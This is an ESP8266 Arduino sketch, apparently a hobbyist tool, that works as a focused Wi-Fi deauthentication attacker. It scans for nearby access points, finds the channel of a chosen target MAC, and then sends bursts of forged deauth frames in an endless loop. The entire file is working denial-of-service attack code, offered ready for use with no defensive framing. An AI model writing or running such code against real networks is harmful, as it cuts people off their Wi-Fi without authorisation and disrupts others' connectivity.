// ESP8266 Focused Deauther with Auto Channel Detection & Passive Scan Fallback
// Description:
// - Accepts a target MAC address (manual)
// - If no MAC is provided, performs a passive scan and lists nearby APs
// - If MAC is valid, scans all Wi-Fi channels to locate the AP and its channel
// - Locks on that channel and sends repeated deauth packets

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

const char* targetMACStr = ""; // Leave blank to enter scan mode (e.g., "DE:AD:BE:EF:11:22")
#define DEAUTH_INTERVAL 100
#define BURST_COUNT 10
#define SCAN_DURATION 4000

uint8_t targetMAC[6];
bool macSet = false;
uint8_t detectedChannel = 1;
bool channelFound = false;
bool scanning = false;

uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

bool parseMAC(const char* macStr, uint8_t* mac) {
  if (strlen(macStr) != 17) return false;
  sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  return true;
}

void snifferCallbackDetectChannel(uint8_t* buf, uint16_t len) {
  if (len < 36) return;
  uint8_t frameType = buf[0];
  if ((frameType & 0xF0) == 0x80) {
    uint8_t* bssid = &buf[10];
    if (memcmp(bssid, targetMAC, 6) == 0) {
      detectedChannel = buf[36];
      channelFound = true;
      Serial.printf("[INFO] Target AP found on channel %d\n", detectedChannel);
      wifi_promiscuous_enable(0);
    }
  }
}

void snifferCallbackScan(uint8_t* buf, uint16_t len) {
  if (!scanning || len < 36) return;
  uint8_t frameType = buf[0];
  if ((frameType & 0xF0) == 0x80) {
    uint8_t* bssid = &buf[10];
    Serial.printf("[SCAN] Found AP: %02X:%02X:%02X:%02X:%02X:%02X on CH%d\n",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], buf[36]);
  }
}

void detectChannel() {
  channelFound = false;
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(snifferCallbackDetectChannel);

  for (uint8_t ch = 1; ch <= 13; ch++) {
    wifi_set_channel(ch);
    wifi_promiscuous_enable(1);
    delay(200);
    wifi_promiscuous_enable(0);
    if (channelFound) break;
  }

  if (!channelFound) {
    Serial.println("[WARN] Channel detection failed. Defaulting to CH1.");
    detectedChannel = 1;
  }
}

void setDeauthMACs(uint8_t* mac) {
  memcpy(&deauthPacket[10], mac, 6);
  memcpy(&deauthPacket[16], mac, 6);
}

void passiveScan() {
  Serial.println("[SCAN] Starting 4-second scan. Nearby APs:");
  scanning = true;
  wifi_set_opmode(STATION_MODE);
  wifi_set_promiscuous_rx_cb(snifferCallbackScan);

  for (uint8_t ch = 1; ch <= 13; ch++) {
    wifi_set_channel(ch);
    wifi_promiscuous_enable(1);
    delay(SCAN_DURATION / 13);
    wifi_promiscuous_enable(0);
  }
  scanning = false;
  Serial.println("[SCAN] Done. Update targetMACStr to begin attack.");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  delay(100);

  if (strlen(targetMACStr) == 17 && parseMAC(targetMACStr, targetMAC)) {
    macSet = true;
    Serial.println("[INFO] Valid target MAC provided.");
  } else {
    Serial.println("[INFO] No MAC provided. Entering passive scan mode.");
    passiveScan();
    return;
  }

  detectChannel();
  wifi_set_channel(detectedChannel);
  setDeauthMACs(targetMAC);
  Serial.println("[READY] Beginning deauth attack loop.");
}

void loop() {
  if (!macSet) return;

  Serial.printf("[DEAUTH] Sending burst to %02X:%02X:%02X:%02X:%02X:%02X on CH%d\n",
                targetMAC[0], targetMAC[1], targetMAC[2],
                targetMAC[3], targetMAC[4], targetMAC[5],
                detectedChannel);

  for (int i = 0; i < BURST_COUNT; i++) {
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    delay(DEAUTH_INTERVAL);
  }
  delay(1000);
}